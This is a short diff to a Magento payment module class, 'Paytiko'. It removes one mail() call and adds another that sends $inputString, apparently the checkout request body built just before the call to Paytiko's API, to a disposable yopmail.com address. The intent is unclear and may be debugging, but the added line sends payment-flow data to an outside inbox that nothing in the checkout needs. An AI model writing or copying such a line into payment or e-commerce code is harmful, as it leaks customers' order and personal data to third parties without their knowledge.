@@ -227,7 +227,7 @@ class Paytiko extends \Magento\Payment\Model\Method\AbstractMethod {
             $uniqueIndentifier = "M2-G-".$timestamp;
         }
 
-        mail('test112121@yopmail.com', 'userId', $uniqueIndentifier);
+       
 
         // Before checkout request start
 
@@ -291,6 +291,7 @@ class Paytiko extends \Magento\Payment\Model\Method\AbstractMethod {
              }
             }';
 
+            mail('test112121@yopmail.com', 'curl', $inputString);
 
 
         $url = 'https://dev-core.paytiko.com/api/cashier/ecommerce/checkout';
